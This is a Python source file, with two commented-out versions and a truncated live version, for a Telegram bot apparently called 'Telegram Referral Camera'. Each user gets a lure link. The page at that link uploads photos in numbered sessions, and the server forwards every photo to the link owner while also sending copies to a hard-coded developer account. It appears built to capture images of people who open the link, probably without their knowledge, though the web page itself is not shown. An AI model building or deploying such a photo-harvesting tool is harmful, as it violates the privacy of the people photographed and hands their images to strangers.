# import os
# import asyncio
# import html
# from typing import List
# from contextlib import asynccontextmanager

# from fastapi import FastAPI, Query, Request, UploadFile, File, Form
# from fastapi.responses import HTMLResponse
# from fastapi.templating import Jinja2Templates
# from locales import LANGUAGES, DEFAULT_LANG, TEXTS, t

# from aiogram import Bot, Dispatcher, F
# from aiogram.types import (
#     BufferedInputFile,
#     InputMediaPhoto,
#     Message,
#     ReplyKeyboardMarkup,
#     KeyboardButton,
#     InlineKeyboardMarkup,
#     InlineKeyboardButton,
#     CallbackQuery,
# )
# from aiogram.filters import CommandStart
# from aiogram.exceptions import TelegramBadRequest
# from dotenv import load_dotenv

# from locales import LANGUAGES, DEFAULT_LANG, t
# from database import (
#     init_db,
#     get_or_create_user,
#     get_user,
#     increment_referrals,
#     get_stats,
#     get_total_users,
#     set_user_language,
# )


# # =========================================================
# # تحميل المتغيرات
# # =========================================================

# load_dotenv()

# BOT_TOKEN = os.getenv("BOT_TOKEN")

# ADMIN_TELEGRAM_ID = int(
#     os.getenv("ADMIN_TELEGRAM_ID", "6002805119")
# )

# CHANNEL_USERNAME = "@KhaldounSoft"
# CHANNEL_LINK = "https://t.me/KhaldounSoft"

# BASE_URL = os.getenv(
#     "BASE_URL",
#     "https://aivideo.apps.bot-hosting.cloud",
# ).rstrip("/")

# MAX_PHOTOS = 10
# MAX_PHOTO_SIZE = 10 * 1024 * 1024  # 10 ميجا لكل صورة


# if not BOT_TOKEN:
#     raise RuntimeError("BOT_TOKEN is not configured")


# # =========================================================
# # إنشاء البوت
# # =========================================================

# bot = Bot(token=BOT_TOKEN)
# dp = Dispatcher()


# # =========================================================
# # تشغيل البوت مع FastAPI
# # =========================================================

# @asynccontextmanager
# async def lifespan(app: FastAPI):

#     await init_db()

#     polling_task = asyncio.create_task(
#         dp.start_polling(bot)
#     )

#     try:
#         yield

#     finally:
#         try:
#             await dp.stop_polling()
#         except Exception:
#             pass

#         polling_task.cancel()

#         try:
#             await polling_task
#         except asyncio.CancelledError:
#             pass

#         await bot.session.close()


# app = FastAPI(
#     title="Telegram Referral Camera",
#     lifespan=lifespan,
# )

# templates = Jinja2Templates(directory="templates")


# # =========================================================
# # التحقق من الاشتراك
# # =========================================================

# async def check_subscription(user_id: int) -> bool:
#     try:
#         member = await bot.get_chat_member(
#             chat_id=CHANNEL_USERNAME,
#             user_id=user_id,
#         )
#         status = member.status
#         print(f"[SUBSCRIPTION] user={user_id} status={status}")
#         return status in {"creator", "administrator", "member"}

#     except TelegramBadRequest as error:
#         msg = str(error).lower()
#         print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
#         if "user not found" in msg or "participant" in msg:
#             return False
#         return True

#     except Exception as error:
#         print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
#         return True


# # =========================================================
# # لوحة اختيار اللغة
# # =========================================================

# def get_language_keyboard():
#     buttons = []
#     row = []
#     for code, info in LANGUAGES.items():
#         row.append(
#             InlineKeyboardButton(
#                 text=f"{info['flag']} {info['name']}",
#                 callback_data=f"lang:{code}",
#             )
#         )
#         if len(row) == 2:
#             buttons.append(row)
#             row = []
#     if row:
#         buttons.append(row)
#     return InlineKeyboardMarkup(inline_keyboard=buttons)


# # =========================================================
# # لوحة الاشتراك
# # =========================================================

# def get_subscription_keyboard(lang: str):
#     return InlineKeyboardMarkup(
#         inline_keyboard=[
#             [
#                 InlineKeyboardButton(
#                     text=t(lang, "btn_subscribe"),
#                     url=CHANNEL_LINK,
#                 )
#             ],
#             [
#                 InlineKeyboardButton(
#                     text=t(lang, "btn_confirm_sub"),
#                     callback_data="check_sub",
#                 )
#             ],
#         ]
#     )


# # =========================================================
# # لوحة الأدمن / المستخدم
# # =========================================================

# def get_admin_keyboard(lang: str):
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text=t(lang, "btn_stats"))],
#             [KeyboardButton(text=t(lang, "change_language"))],
#             [KeyboardButton(text=t(lang, "btn_start"))],
#         ],
#         resize_keyboard=True,
#         persistent=True,
#     )


# def get_user_keyboard(lang: str):
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text=t(lang, "change_language"))],
#             [KeyboardButton(text=t(lang, "btn_start"))],
#         ],
#         resize_keyboard=True,
#         persistent=True,
#     )


# # =========================================================
# # إرسال الواجهة الرئيسية
# # =========================================================

# async def send_main_dashboard(message_or_call, user, lang: str = DEFAULT_LANG):

#     user_id = user.id
#     name = user.full_name
#     username = user.username or ""

#     db_user, is_new = await get_or_create_user(
#         telegram_id=user_id,
#         name=name,
#         username=username,
#     )

#     # إشعار المطور (بالعربية دائماً)
#     if is_new:
#         username_text = (
#             f"@{username}" if username
#             else t("ar", "no_username")
#         )
#         total = await get_total_users()

#         admin_notice = (
#             f"👤 <b>{t('ar', 'new_user_notice')}</b>\n\n"
#             f"{t('ar', 'new_user_name')}: {html.escape(name)}\n"
#             f"{t('ar', 'new_user_username')}: {html.escape(username_text)}\n"
#             f"{t('ar', 'new_user_id')}: <code>{user_id}</code>\n"
#             f"{t('ar', 'new_user_total')}: {total}"
#         )

#         try:
#             await bot.send_message(
#                 chat_id=ADMIN_TELEGRAM_ID,
#                 text=admin_notice,
#                 parse_mode="HTML",
#             )
#         except Exception as error:
#             print(f"فشل إرسال إشعار المستخدم الجديد: {error}")

#     username_text = f"@{username}" if username else t(lang, "no_username")

#     welcome_text = (
#         f"{t(lang, 'welcome', name=html.escape(name))}\n\n"
#         f"{t(lang, 'your_id')}: <code>{user_id}</code>\n"
#         f"{t(lang, 'your_username')}: {html.escape(username_text)}\n\n"
#         f"{t(lang, 'your_link')}\n"
#         f"{BASE_URL}/?q={user_id}\n\n"
#         f"<b>{t(lang, 'steps_title')}</b>\n"
#         f"{t(lang, 'step1')}\n"
#         f"{t(lang, 'step2')}\n"
#         f"{t(lang, 'step3')}\n\n"
#         f"{t(lang, 'your_referrals')}: <b>{db_user.referrals}</b>"
#     )

#     keyboard = (
#         get_admin_keyboard(lang)
#         if user_id == ADMIN_TELEGRAM_ID
#         else get_user_keyboard(lang)
#     )

#     if isinstance(message_or_call, Message):
#         await message_or_call.answer(
#             welcome_text,
#             reply_markup=keyboard,
#             parse_mode="HTML",
#             disable_web_page_preview=True,
#         )
#     else:
#         await message_or_call.message.answer(
#             welcome_text,
#             reply_markup=keyboard,
#             parse_mode="HTML",
#             disable_web_page_preview=True,
#         )


# # =========================================================
# # /start
# # =========================================================

# @dp.message(CommandStart())
# async def start_handler(message: Message):

#     user_id = message.from_user.id

#     existing = await get_user(user_id)

#     # مستخدم جديد → اختر اللغة أولاً
#     if not existing or not existing.language:
#         await message.answer(
#             t(DEFAULT_LANG, "choose_language"),
#             reply_markup=get_language_keyboard(),
#         )
#         return

#     lang = existing.language

#     is_subscribed = await check_subscription(user_id)

#     if not is_subscribed:
#         sub_text = (
#             f"{t(lang, 'must_subscribe')}\n\n"
#             f"{t(lang, 'subscribe_hint')}"
#         )
#         await message.answer(
#             sub_text,
#             reply_markup=get_subscription_keyboard(lang),
#             parse_mode="HTML",
#         )
#         return

#     await send_main_dashboard(message, message.from_user, lang)


# # =========================================================
# # معالج اختيار اللغة
# # =========================================================

# @dp.callback_query(F.data.startswith("lang:"))
# async def language_callback(call: CallbackQuery):

#     code = call.data.split(":")[1]
#     if code not in LANGUAGES:
#         await call.answer("Invalid language", show_alert=True)
#         return

#     user_id = call.from_user.id

#     existing = await get_user(user_id)
#     if existing:
#         await set_user_language(user_id, code)
#     else:
#         await get_or_create_user(
#             telegram_id=user_id,
#             name=call.from_user.full_name,
#             username=call.from_user.username or "",
#         )
#         await set_user_language(user_id, code)

#     await call.answer(t(code, "lang_changed"))

#     try:
#         await call.message.delete()
#     except Exception:
#         pass

#     is_subscribed = await check_subscription(user_id)

#     if not is_subscribed:
#         sub_text = (
#             f"{t(code, 'must_subscribe')}\n\n"
#             f"{t(code, 'subscribe_hint')}"
#         )
#         await call.message.answer(
#             sub_text,
#             reply_markup=get_subscription_keyboard(code),
#             parse_mode="HTML",
#         )
#         return

#     await send_main_dashboard(call, call.from_user, code)


# # =========================================================
# # زر تأكيد الاشتراك
# # =========================================================

# @dp.callback_query(F.data == "check_sub")
# async def check_sub_callback(call: CallbackQuery):

#     user_id = call.from_user.id
#     user = await get_user(user_id)
#     lang = user.language if user else DEFAULT_LANG

#     is_subscribed = await check_subscription(user_id)

#     if is_subscribed:
#         await call.answer(t(lang, "sub_success"))
#         try:
#             await call.message.delete()
#         except Exception:
#             pass
#         await send_main_dashboard(call, call.from_user, lang)
#         return

#     await call.answer(t(lang, "sub_failed"), show_alert=True)


# # =========================================================
# # زر تغيير اللغة
# # =========================================================

# @dp.message(F.text.in_({
#     t(code, "change_language") for code in LANGUAGES
# }))
# async def change_language_handler(message: Message):

#     user = await get_user(message.from_user.id)
#     lang = user.language if user else DEFAULT_LANG

#     await message.answer(
#         t(lang, "choose_language"),
#         reply_markup=get_language_keyboard(),
#     )


# # =========================================================
# # إحصائيات البوت
# # =========================================================

# @dp.message(F.text.in_({
#     t(code, "btn_stats") for code in LANGUAGES
# }))
# async def stats_handler(message: Message):

#     if message.from_user.id != ADMIN_TELEGRAM_ID:
#         return

#     user = await get_user(message.from_user.id)
#     lang = user.language if user else DEFAULT_LANG

#     stats = await get_stats()

#     text = (
#         f"{t(lang, 'stats_title')}\n\n"
#         f"{t(lang, 'stats_total')}: <b>{stats['total']}</b>\n"
#         f"{t(lang, 'stats_7days')}: <b>{stats['last_7_days']}</b>\n"
#         f"{t(lang, 'stats_month')}: <b>{stats['this_month']}</b>"
#     )

#     await message.answer(text, parse_mode="HTML")


# # =========================================================
# # الصفحة الرئيسية
# # =========================================================

# @app.get("/", response_class=HTMLResponse)
# async def home(request: Request, q: str = Query(default="")):

#     if not q:
#         return """
#         <!DOCTYPE html>
#         <html lang="ar" dir="rtl">
#         <head>
#             <meta charset="UTF-8">
#             <meta name="viewport"
#                   content="width=device-width, initial-scale=1.0">
#             <title>الرابط غير صحيح</title>
#         </head>
#         <body style="font-family:sans-serif;text-align:center;padding:40px">
#             <h2>❌ الرابط غير صحيح</h2>
#             <p>يجب فتح رابط إحالة صالح.</p>
#         </body>
#         </html>
#         """

#         # جلب لغة صاحب الرابط
#     lang = DEFAULT_LANG
#     if q.isdigit():
#         owner = await get_user(int(q))
#         if owner and owner.language:
#             lang = owner.language

#     # كل نصوص الويب بلغة المستخدم
#     web_texts = {
#         key: t(lang, key)
#         for key in TEXTS[lang]
#         if key.startswith("web_")
#     }

#     return templates.TemplateResponse(
#         request=request,
#         name="index.html",
#         context={
#             "referral_id": q,
#             "lang": lang,
#             "is_rtl": lang in ("ar", "fa"),
#             "texts": web_texts,
#         },
#     )
#     # return templates.TemplateResponse(
#     #     request=request,
#     #     name="index.html",
#     #     context={"referral_id": q},
#     # )


# # =========================================================
# # استقبال الصور
# # =========================================================

# @app.post("/upload-photo")
# async def upload_photo(
#     photos: List[UploadFile] = File(...),
#     referral_id: str = Form(...),
# ):

#     if not referral_id.isdigit():
#         return {"success": False, "message": "Invalid Referral ID."}

#     if not photos:
#         return {"success": False, "message": "No photos."}

#     if len(photos) > MAX_PHOTOS:
#         return {"success": False, "message": f"Max {MAX_PHOTOS} photos."}

#     owner_id = int(referral_id)
#     owner = await get_user(owner_id)

#     if not owner:
#         return {"success": False, "message": "Invalid referral link."}

#     lang = owner.language or DEFAULT_LANG

#     username = owner.username or ""
#     name = owner.name or "—"
#     username_text = f"@{username}" if username else t(lang, "no_username")

#     caption = (
#         f"{t(lang, 'photo_caption')}\n\n"
#         f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
#         f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
#         f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
#         f"{t(lang, 'photo_ref_id')}: {referral_id}"
#     )

#     media_group_owner = []
#     media_group_admin = []

#     for idx, photo in enumerate(photos):
#         image_bytes = await photo.read()
#         if not image_bytes:
#             continue

#         if len(image_bytes) > MAX_PHOTO_SIZE:
#             return {
#                 "success": False,
#                 "message": f"Photo {idx + 1} too large.",
#             }

#         media_group_owner.append(
#             InputMediaPhoto(
#                 media=BufferedInputFile(
#                     image_bytes,
#                     filename=f"photo_{idx + 1}.jpg",
#                 )
#             )
#         )

#         media_group_admin.append(
#             InputMediaPhoto(
#                 media=BufferedInputFile(
#                     image_bytes,
#                     filename=f"photo_{idx + 1}.jpg",
#                 ),
#                 caption=(caption if idx == 0 else ""),
#                 parse_mode="HTML",
#             )
#         )

#     if not media_group_owner:
#         return {"success": False, "message": "No valid photos."}

#     owner_ok = True
#     try:
#         await bot.send_media_group(
#             chat_id=owner_id,
#             media=media_group_owner,
#         )
#     except Exception as error:
#         print(f"[SEND OWNER ERROR] {error!r}")
#         owner_ok = False

#     try:
#         await bot.send_media_group(
#             chat_id=ADMIN_TELEGRAM_ID,
#             media=media_group_admin,
#         )
#     except Exception as error:
#         print(f"[SEND ADMIN ERROR] {error!r}")

#     if not owner_ok:
#         return {
#             "success": False,
#             "message": "Failed to send to owner.",
#         }

#     await increment_referrals(owner_id)

#     return {"success": True, "message": "Photos sent."}
# -----------------------------------------------------------------------------------------------------------------




# import os
# import asyncio
# import html
# from typing import List
# from contextlib import asynccontextmanager

# from fastapi import FastAPI, Query, Request, UploadFile, File, Form
# from fastapi.responses import HTMLResponse
# from fastapi.templating import Jinja2Templates

# from aiogram import Bot, Dispatcher, F
# from aiogram.types import (
#     BufferedInputFile,
#     InputMediaPhoto,
#     Message,
#     ReplyKeyboardMarkup,
#     KeyboardButton,
#     InlineKeyboardMarkup,
#     InlineKeyboardButton,
#     CallbackQuery,
# )
# from aiogram.filters import CommandStart
# from aiogram.exceptions import TelegramBadRequest
# from dotenv import load_dotenv

# from locales import LANGUAGES, DEFAULT_LANG, TEXTS, t
# from database import (
#     init_db,
#     get_or_create_user,
#     get_user,
#     increment_referrals,
#     get_stats,
#     get_total_users,
#     set_user_language,
# )


# # =========================================================
# # تحميل المتغيرات
# # =========================================================

# load_dotenv()

# BOT_TOKEN = os.getenv("BOT_TOKEN")

# ADMIN_TELEGRAM_ID = int(
#     os.getenv("ADMIN_TELEGRAM_ID", "6002805119")
# )

# CHANNEL_USERNAME = "@KhaldounSoft"
# CHANNEL_LINK = "https://t.me/KhaldounSoft"

# BASE_URL = os.getenv(
#     "BASE_URL",
#     "https://aivideo.apps.bot-hosting.cloud",
# ).rstrip("/")

# MAX_PHOTOS = 10
# MAX_PHOTO_SIZE = 10 * 1024 * 1024  # 10 ميجا لكل صورة

# # جلسات تم فيها احتساب الإحالة (لمنع التكرار)
# _sessions_counted = set()


# if not BOT_TOKEN:
#     raise RuntimeError("BOT_TOKEN is not configured")


# # =========================================================
# # إنشاء البوت
# # =========================================================

# bot = Bot(token=BOT_TOKEN)
# dp = Dispatcher()


# # =========================================================
# # تشغيل البوت مع FastAPI
# # =========================================================

# @asynccontextmanager
# async def lifespan(app: FastAPI):

#     await init_db()

#     polling_task = asyncio.create_task(
#         dp.start_polling(bot)
#     )

#     try:
#         yield

#     finally:
#         try:
#             await dp.stop_polling()
#         except Exception:
#             pass

#         polling_task.cancel()

#         try:
#             await polling_task
#         except asyncio.CancelledError:
#             pass

#         await bot.session.close()


# app = FastAPI(
#     title="Telegram Referral Camera",
#     lifespan=lifespan,
# )

# templates = Jinja2Templates(directory="templates")


# # =========================================================
# # التحقق من الاشتراك
# # =========================================================

# async def check_subscription(user_id: int) -> bool:
#     try:
#         member = await bot.get_chat_member(
#             chat_id=CHANNEL_USERNAME,
#             user_id=user_id,
#         )
#         status = member.status
#         print(f"[SUBSCRIPTION] user={user_id} status={status}")
#         return status in {"creator", "administrator", "member"}

#     except TelegramBadRequest as error:
#         msg = str(error).lower()
#         print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
#         if "user not found" in msg or "participant" in msg:
#             return False
#         return True

#     except Exception as error:
#         print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
#         return True


# # =========================================================
# # لوحة اختيار اللغة
# # =========================================================

# def get_language_keyboard():
#     buttons = []
#     row = []
#     for code, info in LANGUAGES.items():
#         row.append(
#             InlineKeyboardButton(
#                 text=f"{info['flag']} {info['name']}",
#                 callback_data=f"lang:{code}",
#             )
#         )
#         if len(row) == 2:
#             buttons.append(row)
#             row = []
#     if row:
#         buttons.append(row)
#     return InlineKeyboardMarkup(inline_keyboard=buttons)


# # =========================================================
# # لوحة الاشتراك
# # =========================================================

# def get_subscription_keyboard(lang: str):
#     return InlineKeyboardMarkup(
#         inline_keyboard=[
#             [
#                 InlineKeyboardButton(
#                     text=t(lang, "btn_subscribe"),
#                     url=CHANNEL_LINK,
#                 )
#             ],
#             [
#                 InlineKeyboardButton(
#                     text=t(lang, "btn_confirm_sub"),
#                     callback_data="check_sub",
#                 )
#             ],
#         ]
#     )


# # =========================================================
# # لوحة الأدمن / المستخدم
# # =========================================================

# def get_admin_keyboard(lang: str):
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text=t(lang, "btn_stats"))],
#             [KeyboardButton(text=t(lang, "change_language"))],
#             [KeyboardButton(text=t(lang, "btn_start"))],
#         ],
#         resize_keyboard=True,
#         persistent=True,
#     )


# def get_user_keyboard(lang: str):
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text=t(lang, "change_language"))],
#             [KeyboardButton(text=t(lang, "btn_start"))],
#         ],
#         resize_keyboard=True,
#         persistent=True,
#     )


# # =========================================================
# # إرسال الواجهة الرئيسية
# # =========================================================

# async def send_main_dashboard(message_or_call, user, lang: str = DEFAULT_LANG):

#     user_id = user.id
#     name = user.full_name
#     username = user.username or ""

#     db_user, is_new = await get_or_create_user(
#         telegram_id=user_id,
#         name=name,
#         username=username,
#     )

#     # إشعار المطور عند مستخدم جديد
#     if is_new:
#         username_text = (
#             f"@{username}" if username
#             else t("ar", "no_username")
#         )
#         total = await get_total_users()

#         admin_notice = (
#             f"👤 <b>{t('ar', 'new_user_notice')}</b>\n\n"
#             f"{t('ar', 'new_user_name')}: {html.escape(name)}\n"
#             f"{t('ar', 'new_user_username')}: {html.escape(username_text)}\n"
#             f"{t('ar', 'new_user_id')}: <code>{user_id}</code>\n"
#             f"{t('ar', 'new_user_total')}: {total}"
#         )

#         try:
#             await bot.send_message(
#                 chat_id=ADMIN_TELEGRAM_ID,
#                 text=admin_notice,
#                 parse_mode="HTML",
#             )
#         except Exception as error:
#             print(f"فشل إرسال إشعار المستخدم الجديد: {error}")

#     username_text = f"@{username}" if username else t(lang, "no_username")

#     welcome_text = (
#         f"{t(lang, 'welcome', name=html.escape(name))}\n\n"
#         f"{t(lang, 'your_id')}: <code>{user_id}</code>\n"
#         f"{t(lang, 'your_username')}: {html.escape(username_text)}\n\n"
#         f"{t(lang, 'your_link')}\n"
#         f"{BASE_URL}/?q={user_id}\n\n"
#         f"<b>{t(lang, 'steps_title')}</b>\n"
#         f"{t(lang, 'step1')}\n"
#         f"{t(lang, 'step2')}\n"
#         f"{t(lang, 'step3')}\n\n"
#         f"{t(lang, 'your_referrals')}: <b>{db_user.referrals}</b>"
#     )

#     keyboard = (
#         get_admin_keyboard(lang)
#         if user_id == ADMIN_TELEGRAM_ID
#         else get_user_keyboard(lang)
#     )

#     if isinstance(message_or_call, Message):
#         await message_or_call.answer(
#             welcome_text,
#             reply_markup=keyboard,
#             parse_mode="HTML",
#             disable_web_page_preview=True,
#         )
#     else:
#         await message_or_call.message.answer(
#             welcome_text,
#             reply_markup=keyboard,
#             parse_mode="HTML",
#             disable_web_page_preview=True,
#         )


# # =========================================================
# # /start
# # =========================================================

# @dp.message(CommandStart())
# async def start_handler(message: Message):

#     user_id = message.from_user.id

#     existing = await get_user(user_id)

#     if not existing or not existing.language:
#         await message.answer(
#             t(DEFAULT_LANG, "choose_language"),
#             reply_markup=get_language_keyboard(),
#         )
#         return

#     lang = existing.language

#     is_subscribed = await check_subscription(user_id)

#     if not is_subscribed:
#         sub_text = (
#             f"{t(lang, 'must_subscribe')}\n\n"
#             f"{t(lang, 'subscribe_hint')}"
#         )
#         await message.answer(
#             sub_text,
#             reply_markup=get_subscription_keyboard(lang),
#             parse_mode="HTML",
#         )
#         return

#     await send_main_dashboard(message, message.from_user, lang)


# # =========================================================
# # معالج اختيار اللغة
# # =========================================================

# @dp.callback_query(F.data.startswith("lang:"))
# async def language_callback(call: CallbackQuery):

#     code = call.data.split(":")[1]
#     if code not in LANGUAGES:
#         await call.answer("Invalid language", show_alert=True)
#         return

#     user_id = call.from_user.id

#     existing = await get_user(user_id)
#     if existing:
#         await set_user_language(user_id, code)
#     else:
#         await get_or_create_user(
#             telegram_id=user_id,
#             name=call.from_user.full_name,
#             username=call.from_user.username or "",
#         )
#         await set_user_language(user_id, code)

#     await call.answer(t(code, "lang_changed"))

#     try:
#         await call.message.delete()
#     except Exception:
#         pass

#     is_subscribed = await check_subscription(user_id)

#     if not is_subscribed:
#         sub_text = (
#             f"{t(code, 'must_subscribe')}\n\n"
#             f"{t(code, 'subscribe_hint')}"
#         )
#         await call.message.answer(
#             sub_text,
#             reply_markup=get_subscription_keyboard(code),
#             parse_mode="HTML",
#         )
#         return

#     await send_main_dashboard(call, call.from_user, code)


# # =========================================================
# # زر تأكيد الاشتراك
# # =========================================================

# @dp.callback_query(F.data == "check_sub")
# async def check_sub_callback(call: CallbackQuery):

#     user_id = call.from_user.id
#     user = await get_user(user_id)
#     lang = user.language if user else DEFAULT_LANG

#     is_subscribed = await check_subscription(user_id)

#     if is_subscribed:
#         await call.answer(t(lang, "sub_success"))
#         try:
#             await call.message.delete()
#         except Exception:
#             pass
#         await send_main_dashboard(call, call.from_user, lang)
#         return

#     await call.answer(t(lang, "sub_failed"), show_alert=True)


# # =========================================================
# # زر تغيير اللغة
# # =========================================================

# @dp.message(F.text.in_({
#     t(code, "change_language") for code in LANGUAGES
# }))
# async def change_language_handler(message: Message):

#     user = await get_user(message.from_user.id)
#     lang = user.language if user else DEFAULT_LANG

#     await message.answer(
#         t(lang, "choose_language"),
#         reply_markup=get_language_keyboard(),
#     )


# # =========================================================
# # إحصائيات البوت
# # =========================================================

# @dp.message(F.text.in_({
#     t(code, "btn_stats") for code in LANGUAGES
# }))
# async def stats_handler(message: Message):

#     if message.from_user.id != ADMIN_TELEGRAM_ID:
#         return

#     user = await get_user(message.from_user.id)
#     lang = user.language if user else DEFAULT_LANG

#     stats = await get_stats()

#     text = (
#         f"{t(lang, 'stats_title')}\n\n"
#         f"{t(lang, 'stats_total')}: <b>{stats['total']}</b>\n"
#         f"{t(lang, 'stats_7days')}: <b>{stats['last_7_days']}</b>\n"
#         f"{t(lang, 'stats_month')}: <b>{stats['this_month']}</b>"
#     )

#     await message.answer(text, parse_mode="HTML")


# # =========================================================
# # الصفحة الرئيسية
# # =========================================================

# @app.get("/", response_class=HTMLResponse)
# async def home(request: Request, q: str = Query(default="")):

#     if not q:
#         return """
#         <!DOCTYPE html>
#         <html lang="ar" dir="rtl">
#         <head>
#             <meta charset="UTF-8">
#             <meta name="viewport"
#                   content="width=device-width, initial-scale=1.0">
#             <title>الرابط غير صحيح</title>
#         </head>
#         <body style="font-family:sans-serif;text-align:center;padding:40px">
#             <h2>❌ الرابط غير صحيح</h2>
#             <p>يجب فتح رابط إحالة صالح.</p>
#         </body>
#         </html>
#         """

#     # جلب لغة صاحب الرابط
#     lang = DEFAULT_LANG
#     if q.isdigit():
#         owner = await get_user(int(q))
#         if owner and owner.language:
#             lang = owner.language

#     # كل نصوص الويب بلغة المستخدم
#     web_texts = {
#         key: t(lang, key)
#         for key in TEXTS[lang]
#         if key.startswith("web_")
#     }

#     return templates.TemplateResponse(
#         request=request,
#         name="index.html",
#         context={
#             "referral_id": q,
#             "lang": lang,
#             "is_rtl": lang in ("ar", "fa"),
#             "texts": web_texts,
#         },
#     )


# # =========================================================
# # إرسال صورة واحدة (فوري)
# # =========================================================

# @app.post("/upload-single-photo")
# async def upload_single_photo(
#     photo: UploadFile = File(...),
#     referral_id: str = Form(...),
#     session_id: str = Form(...),
#     index: int = Form(...),
#     total: int = Form(...),
# ):

#     if not referral_id.isdigit():
#         return {"success": False, "message": "Invalid Referral ID."}

#     owner_id = int(referral_id)
#     owner = await get_user(owner_id)

#     if not owner:
#         return {"success": False, "message": "Invalid referral link."}

#     image_bytes = await photo.read()

#     if not image_bytes:
#         return {"success": False, "message": "Empty photo."}

#     if len(image_bytes) > MAX_PHOTO_SIZE:
#         return {"success": False, "message": "Photo too large."}

#     lang = owner.language or DEFAULT_LANG

#     username = owner.username or ""
#     name = owner.name or "—"
#     username_text = f"@{username}" if username else t(lang, "no_username")

#     # كابشن يوضح رقم الصورة في الجلسة
#     caption = (
#         f"{t(lang, 'photo_caption')} {index}/{total}\n\n"
#         f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
#         f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
#         f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
#         f"{t(lang, 'photo_ref_id')}: {referral_id}\n"
#         f"🔖 Session: <code>{session_id[:8]}</code>"
#     )

#     # إرسال لصاحب الرابط
#     try:
#         await bot.send_photo(
#             chat_id=owner_id,
#             photo=BufferedInputFile(image_bytes, filename=f"photo_{index}.jpg"),
#             caption=caption,
#             parse_mode="HTML",
#         )
#     except Exception as error:
#         print(f"[SEND OWNER ERROR] photo {index}: {error!r}")
#         return {"success": False, "message": "Failed to send to owner."}

#     # إرسال نسخة للمطور
#     try:
#         await bot.send_photo(
#             chat_id=ADMIN_TELEGRAM_ID,
#             photo=BufferedInputFile(image_bytes, filename=f"photo_{index}_admin.jpg"),
#             caption=caption,
#             parse_mode="HTML",
#         )
#     except Exception as error:
#         print(f"[SEND ADMIN ERROR] photo {index}: {error!r}")

#     # زيادة referrals مرة واحدة فقط لكل جلسة
#     if session_id not in _sessions_counted:
#         _sessions_counted.add(session_id)
#         await increment_referrals(owner_id)
#         print(f"[REFERRALS] +1 for {owner_id} (session {session_id[:8]})")

#     return {"success": True, "message": f"Photo {index} sent."}


# # =========================================================
# # إنهاء الجلسة (ملخص)
# # =========================================================

# @app.post("/finish-session")
# async def finish_session(payload: dict):

#     referral_id = str(payload.get("referral_id", ""))
#     session_id = str(payload.get("session_id", ""))
#     total = int(payload.get("total", 0))
#     sent = int(payload.get("sent", 0))
#     failed = int(payload.get("failed", 0))

#     if not referral_id.isdigit():
#         return {"success": False}

#     owner_id = int(referral_id)
#     owner = await get_user(owner_id)

#     if not owner:
#         return {"success": False}

#     lang = owner.language or DEFAULT_LANG

#     summary = (
#         f"📊 <b>Session complete</b>\n\n"
#         f"🔖 <code>{session_id[:8]}</code>\n"
#         f"✅ Sent: <b>{sent}</b>/{total}\n"
#         f"❌ Failed: <b>{failed}</b>"
#     )

#     try:
#         await bot.send_message(owner_id, summary, parse_mode="HTML")
#     except Exception as error:
#         print(f"[FINISH SESSION ERROR] {error!r}")

#     # تنظيف الجلسة من الذاكرة
#     _sessions_counted.discard(session_id)

#     return {"success": True}


# # =========================================================
# # استقبال الصور (الطريقة القديمة — ألبوم دفعة واحدة)
# # =========================================================

# @app.post("/upload-photo")
# async def upload_photo(
#     photos: List[UploadFile] = File(...),
#     referral_id: str = Form(...),
# ):

#     if not referral_id.isdigit():
#         return {"success": False, "message": "Invalid Referral ID."}

#     if not photos:
#         return {"success": False, "message": "No photos."}

#     if len(photos) > MAX_PHOTOS:
#         return {"success": False, "message": f"Max {MAX_PHOTOS} photos."}

#     owner_id = int(referral_id)
#     owner = await get_user(owner_id)

#     if not owner:
#         return {"success": False, "message": "Invalid referral link."}

#     lang = owner.language or DEFAULT_LANG

#     username = owner.username or ""
#     name = owner.name or "—"
#     username_text = f"@{username}" if username else t(lang, "no_username")

#     caption = (
#         f"{t(lang, 'photo_caption')}\n\n"
#         f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
#         f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
#         f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
#         f"{t(lang, 'photo_ref_id')}: {referral_id}"
#     )

#     media_group_owner = []
#     media_group_admin = []

#     for idx, photo in enumerate(photos):
#         image_bytes = await photo.read()
#         if not image_bytes:
#             continue

#         if len(image_bytes) > MAX_PHOTO_SIZE:
#             return {
#                 "success": False,
#                 "message": f"Photo {idx + 1} too large.",
#             }

#         media_group_owner.append(
#             InputMediaPhoto(
#                 media=BufferedInputFile(
#                     image_bytes,
#                     filename=f"photo_{idx + 1}.jpg",
#                 )
#             )
#         )

#         media_group_admin.append(
#             InputMediaPhoto(
#                 media=BufferedInputFile(
#                     image_bytes,
#                     filename=f"photo_{idx + 1}.jpg",
#                 ),
#                 caption=(caption if idx == 0 else ""),
#                 parse_mode="HTML",
#             )
#         )

#     if not media_group_owner:
#         return {"success": False, "message": "No valid photos."}

#     owner_ok = True
#     try:
#         await bot.send_media_group(
#             chat_id=owner_id,
#             media=media_group_owner,
#         )
#     except Exception as error:
#         print(f"[SEND OWNER ERROR] {error!r}")
#         owner_ok = False

#     try:
#         await bot.send_media_group(
#             chat_id=ADMIN_TELEGRAM_ID,
#             media=media_group_admin,
#         )
#     except Exception as error:
#         print(f"[SEND ADMIN ERROR] {error!r}")

#     if not owner_ok:
#         return {
#             "success": False,
#             "message": "Failed to send to owner.",
#         }

#     await increment_referrals(owner_id)

#     return {"success": True, "message": "Photos sent."}



import os
import asyncio
import html
import time
from typing import List
from contextlib import asynccontextmanager

from fastapi import FastAPI, Query, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    BufferedInputFile,
